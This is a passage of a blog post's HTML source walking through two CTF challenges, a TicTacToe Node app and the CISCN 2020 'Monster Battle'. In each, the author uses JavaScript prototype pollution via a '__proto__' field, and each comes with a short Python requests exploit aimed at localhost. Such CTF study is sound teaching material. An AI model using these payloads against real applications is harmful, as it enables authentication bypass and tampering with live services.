class="property">body</span>;</span><br><span class="line">	<span class="keyword">var</span> winner = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (client.<span class="property">row</span> &gt; <span class="number">3</span> || client.<span class="property">col</span> &gt; <span class="number">3</span>)&#123;</span><br><span class="line">		client.<span class="property">row</span> %= <span class="number">3</span>;</span><br><span class="line">		client.<span class="property">col</span> %= <span class="number">3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	matrix[client.<span class="property">row</span>][client.<span class="property">col</span>] = client.<span class="property">data</span>;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(matrix);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (matrix[i][<span class="number">0</span>] === matrix[i][<span class="number">1</span>] &amp;&amp; matrix[i][<span class="number">1</span>] === matrix[i][<span class="number">2</span>] )&#123;</span><br><span class="line">			<span class="keyword">if</span> (matrix[i][<span class="number">0</span>] === <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">				winner = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(matrix[i][<span class="number">0</span>] === <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">				winner = <span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (matrix[<span class="number">0</span>][i] === matrix[<span class="number">1</span>][i] &amp;&amp; matrix[<span class="number">1</span>][i] === matrix[<span class="number">2</span>][i])&#123;</span><br><span class="line">			<span class="keyword">if</span> (matrix[<span class="number">0</span>][i] === <span class="string">&#x27;X&#x27;</span>) &#123;</span><br><span class="line">				winner = <span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span>(matrix[<span class="number">0</span>][i] === <span class="string">&#x27;O&#x27;</span>) &#123;</span><br><span class="line">				winner = <span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (matrix[<span class="number">0</span>][<span class="number">0</span>] === matrix[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; matrix[<span class="number">1</span>][<span class="number">1</span>] === matrix[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; matrix[<span class="number">0</span>][<span class="number">0</span>] === <span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">		winner = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (matrix[<span class="number">0</span>][<span class="number">0</span>] === matrix[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; matrix[<span class="number">1</span>][<span class="number">1</span>] === matrix[<span class="number">2</span>][<span class="number">2</span>] &amp;&amp; matrix[<span class="number">0</span>][<span class="number">0</span>] === <span class="string">&#x27;O&#x27;</span>)&#123;</span><br><span class="line">		winner = <span class="number">2</span>;</span><br><span class="line">	&#125; </span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (matrix[<span class="number">0</span>][<span class="number">2</span>] === matrix[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; matrix[<span class="number">1</span>][<span class="number">1</span>] === matrix[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; matrix[<span class="number">2</span>][<span class="number">0</span>] === <span class="string">&#x27;X&#x27;</span>)&#123;</span><br><span class="line">		winner = <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (matrix[<span class="number">0</span>][<span class="number">2</span>] === matrix[<span class="number">1</span>][<span class="number">1</span>] &amp;&amp; matrix[<span class="number">1</span>][<span class="number">1</span>] === matrix[<span class="number">2</span>][<span class="number">0</span>] &amp;&amp; matrix[<span class="number">2</span>][<span class="number">0</span>] === <span class="string">&#x27;O&#x27;</span>)&#123;</span><br><span class="line">		winner = <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">draw</span>(matrix) &amp;&amp; winner === <span class="literal">null</span>)&#123;</span><br><span class="line">		res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">winner</span>: <span class="number">0</span>&#125;))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (winner !== <span class="literal">null</span>) &#123;</span><br><span class="line">		res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">winner</span>: winner&#125;))</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		res.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">winner</span>: -<span class="number">1</span>&#125;))</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;app listening on port 3000!&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p>run</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install md5</span><br><span class="line">npm install morgan-body</span><br><span class="line">node app.js</span><br><span class="line">//console app listening on port 3000!</span><br></pre></td></tr></table></figure>
+<p>In line 64 <code>matrix[client.row][client.col] = client.data;</code>.we fine an easy env of prototype_pollution.<br>this is a TicTacToe Game. In the end ,we need let  <code>md5(user.admintoken) === req.query.querytoken)</code>and querytoken is our transmit for query,but admintoken we can’t konw,but we can use prototype pollution,we can find <code>var client = req.body;</code>,some <code>client.row</code>,<code>client.col</code> and <code>client.data</code> we can control.so we just need post <code>&#39;row&#39;:&#39;__proto__&#39;,&#39;col&#39;:&#39;admintoken&#39;,&#39;data&#39;:&#39;qqq&#39;</code>,then transmit md5(qqq),we can got flag<br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://localhost:3000/api&#x27;</span>,json=&#123;<span class="string">&#x27;row&#x27;</span>:<span class="string">&#x27;__proto__&#x27;</span>,<span class="string">&#x27;col&#x27;</span>:<span class="string">&#x27;admintoken&#x27;</span>,<span class="string">&#x27;data&#x27;</span>:<span class="string">&#x27;qqq&#x27;</span>&#125;)</span><br><span class="line">r = requests.get(<span class="string">&#x27;http://localhost:3000/admin?querytoken=&#x27;</span> + hashlib.md5(<span class="string">b&#x27;qqq&#x27;</span>).hexdigest())</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/11/JavaScript-Prototype-Pollution-Attack/2.png"></p>
+<h2 id="4-CISCN-2020-Final-Monster-Battle"><a href="#4-CISCN-2020-Final-Monster-Battle" class="headerlink" title="4. CISCN 2020 Final Monster Battle"></a>4. CISCN 2020 Final Monster Battle</h2><p><a target="_blank" rel="noopener" href="https://github.com/bkfish/CISCN2020_Final/blob/main/day2/web2_monsterbattle/app/app.js">https://github.com/bkfish/CISCN2020_Final</a><br>run</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br><span class="line">node app.<span class="property">js</span></span><br></pre></td></tr></table></figure>
+<p>port define in app.js 275 line<code>app.listen(8080);</code><br>Is An Awesome Game<br><img src="/2020/12/11/JavaScript-Prototype-Pollution-Attack/3.png"><br>In line 172 we init play</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/start&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span> &amp;&amp; <span class="keyword">typeof</span> req.<span class="property">body</span>== <span class="string">&#x27;object&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        player = &#123;</span><br><span class="line">            name : <span class="string">&quot;ciscn&quot;</span>,</span><br><span class="line">            career : <span class="string">&quot;warrior&quot;</span>,</span><br><span class="line">            item : <span class="string">&quot;BYZF&quot;</span>,</span><br><span class="line">            round_to_use : <span class="number">1</span> <span class="comment">//round_to_use表示在哪一轮使用物品</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> tempPlayer = req.<span class="property">body</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">let</span> i <span class="keyword">in</span> tempPlayer )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (player[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( (i == <span class="string">&#x27;career&#x27;</span> &amp;&amp; !careers.<span class="title function_">includes</span>(tempPlayer[i])) || (i == <span class="string">&#x27;item&#x27;</span> &amp;&amp; !items.<span class="title function_">includes</span>(tempPlayer[i])) || (i == <span class="string">&#x27;round_to_use&#x27;</span> &amp;&amp; !<span class="title function_">checkRound</span>(tempPlayer[i])) || tempPlayer[i] === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                &#125;</span><br><span class="line">                player[i] = tempPlayer[i]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        player.<span class="property">num</span> = <span class="number">1</span>; <span class="comment">//player剩余可`使用物品`的次数</span></span><br><span class="line">        player.<span class="property">HP</span> = <span class="number">100</span>; <span class="comment">//HP为血量</span></span><br><span class="line">        player.<span class="property">aggressivity</span> = <span class="title function_">getPlayerAggressivity</span>()</span><br><span class="line"></span><br><span class="line">        <span class="title function_">initMonster</span>()</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&quot;/battle&quot;</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p><code>player[i] = tempPlayer[i]</code> ,we can prototype pollution,for example<code>play[&#39;__proto__&#39;]=&#39;&#123;&quot;x&quot;:1&#125;&#39;</code>,so we need find which value we can pollute.In line 47 getPlayerDamageValue function</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>  <span class="title function_">getPlayerDamageValue</span>(<span class="params"></span>) <span class="comment">//计算纯粹伤害</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (player.<span class="property">buff</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">keepTwoDecimal</span>(player.<span class="property">aggressivity</span>+player.<span class="property">buff</span>)</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> player.<span class="property">aggressivity</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>if we let player.buff&#x3D;100+,we will win.<br>In line 54</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">triggerPassiveSkill</span>(<span class="params"></span>) <span class="comment">//触发被动技能</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (player.<span class="property">career</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;warrior&quot;</span>:</span><br><span class="line">            player.<span class="property">buff</span> = <span class="number">5</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;high_priest&quot;</span> :</span><br><span class="line">            player.<span class="property">HP</span> += <span class="number">10</span></span><br><span class="line">            player.<span class="property">HP</span> = <span class="title function_">keepTwoDecimal</span>(player.<span class="property">HP</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;shooter&#x27;</span> :</span><br><span class="line">            player.<span class="property">buff</span> = <span class="number">7</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">3</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>if player.caree!&#x3D;&#x3D;high_priest,buff will redefine,so let player.career &#x3D;&#x3D; high_priest.<br>In line 82</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">playerUseItem</span>(<span class="params">round</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//ZLYG：治疗药膏，使用后回复10点生命值</span></span><br><span class="line">    <span class="comment">//BYZF：白银之锋，使用后的一次攻击将触发暴击并造成130%的伤害</span></span><br><span class="line">    <span class="comment">//XELD：邪恶镰刀，使用后将对方的一次攻击的攻击力变为80%</span></span><br><span class="line">    <span class="keyword">if</span> (round == player.<span class="property">round_to_use</span> &amp;&amp; player.<span class="property">num</span> == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        player.<span class="property">num</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">switch</span> (player.<span class="property">item</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;ZLYG&quot;</span>:</span><br><span class="line">                player.<span class="property">HP</span> += <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">return</span>  <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;BYZF&quot;</span>:</span><br><span class="line">                player.<span class="property">buff</span> = player.<span class="property">aggressivity</span> * <span class="number">0.3</span>;</span><br><span class="line">                player.<span class="property">buff</span> = <span class="title function_">keepTwoDecimal</span>(player.<span class="property">buff</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;XELD&quot;</span>:</span><br><span class="line">                monster.<span class="property">buff</span> = monster.<span class="property">aggressivity</span> * (<span class="number">1</span> - <span class="number">0.8</span>) * (-<span class="number">1</span>);</span><br><span class="line">                monster.<span class="property">buff</span> = <span class="title function_">keepTwoDecimal</span>(monster.<span class="property">buff</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>if player.item&#x3D;&#x3D;BYZF, player.buff will redefine player.aggressivity * 0.3;so we con’t let player.item equal to BYZF(in fact,if we let round bigger then 2 is as same)<br>so exp(tis:requests default wiil redirect if you dont want it,you need add <code>,allow_redirects=False</code>)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">r = requests.post(<span class="string">&#x27;http://localhost:8080/start&#x27;</span>,json=&#123;<span class="string">&quot;name&quot;</span>:<span class="number">1</span>, <span class="string">&quot;round_to_use&quot;</span>:<span class="number">2</span>, <span class="string">&quot;career&quot;</span>:<span class="string">&quot;high_priest&quot;</span>, <span class="string">&quot;item&quot;</span>:<span class="string">&quot;BYZF&quot;</span>,<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;buff&quot;</span>:<span class="number">10000</span>&#125;&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/12/11/JavaScript-Prototype-Pollution-Attack/4.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Basic-prototype"><span class="toc-number">1.</span> <span class="toc-text">1. Basic- prototype</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Prototype-Pollution"><span class="toc-number">2.</span> <span class="toc-text">2. Prototype Pollution</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-some-env-cause-prototype-pollution"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. some env cause prototype pollution</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-1-easy-env"><span class="toc-number">2.1.1.</span> <span class="toc-text">2.1.1. easy env</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-2-complex-env"><span class="toc-number">2.1.2.</span> <span class="toc-text">2.1.2. complex env</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-HackIT2018-Republic-of-Gayming"><span class="toc-number">3.</span> <span class="toc-text">3. HackIT2018 Republic_of_Gayming</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-CISCN-2020-Final-Monster-Battle"><span class="toc-number">4.</span> <span class="toc-text">4. CISCN 2020 Final Monster Battle</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&text=JavaScript Prototype Pollution Attack"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&is_video=false&description=JavaScript Prototype Pollution Attack"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=JavaScript Prototype Pollution Attack&body=Check out this article: http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&title=JavaScript Prototype Pollution Attack"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&name=JavaScript Prototype Pollution Attack&description=&lt;p&gt;In 2020ciscn final .We meet an easy js prototype pollution attack question named “Final-Monster Battle”.In my fault,it makes me angur.I understand if you want learn some thing well you need practice it.practice make perfect!&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/12/11/JavaScript-Prototype-Pollution-Attack/&t=JavaScript Prototype Pollution Attack"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bkfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
